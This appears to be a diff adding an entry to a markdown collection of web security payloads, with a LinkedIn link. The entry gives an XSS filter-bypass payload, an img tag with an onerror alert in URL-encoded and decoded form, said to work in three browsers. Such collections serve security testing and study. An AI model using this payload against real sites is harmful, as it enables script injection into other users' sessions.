@@ -39,3 +39,30 @@ https://domain[.]com/ssl-vpn/getconfig.esp?client-type=1&protocol-version=p1&app
 ---
 ---
 
+
+
+* ## ``Same payload, 3 different browsers``
+
+[post_link](https://www.linkedin.com/posts/deepak-saini-cyber_chrome-edge-firefox-activity-7349077676642455554--s05/?utm_source=share&utm_medium=member_android&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)
+
+```
+%3cimg%2fsrc%2fonerror%3dalert%2f%2f%26NewLine%3b(2)%3e
+```
+```
+<img/src/onerror=alert//&(NewLine);(2)>
+```
+
+<img width="562" height="740" alt="image" src="https://github.com/user-attachments/assets/f099187a-c447-4189-9ab6-d1da9bc60a81" />
+
+
+---
+---
+
+
+
+
+
+
+
+
+
